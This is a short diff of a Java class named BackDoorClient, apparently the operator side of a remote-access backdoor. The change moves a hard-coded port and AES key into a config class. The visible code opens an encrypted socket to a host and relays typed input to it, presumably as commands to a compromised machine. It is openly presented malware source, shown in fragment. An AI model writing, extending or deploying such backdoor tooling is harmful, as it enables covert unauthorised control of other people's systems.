@@ -1,6 +1,7 @@
 package com.github.pulsebeat02;
 
 import com.github.pulsebeat02.backdoor.CryptoHelper;
+import com.github.pulsebeat02.config.NetworkAddress;
 import com.github.pulsebeat02.utility.NetworkUtilities;
 
 import java.io.BufferedReader;
@@ -27,12 +28,11 @@ public class BackDoorClient {
     CompletableFuture.runAsync(
         () -> {
           try {
-            final int port = 42069;
             final String endSignal = "%**%";
-            final String encryptionKey = "sixteen byte key";
             final String algorithm = "AES";
-            final CryptoHelper cryptoHelper = new CryptoHelper(encryptionKey, algorithm);
-            final Socket socket = new Socket(host, port);
+            final CryptoHelper cryptoHelper =
+                new CryptoHelper(NetworkAddress.getEncryptionKey(), algorithm);
+            final Socket socket = new Socket(host, NetworkAddress.getPort());
             final Scanner scanner = new Scanner(System.in);
             final PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
             final BufferedReader br =
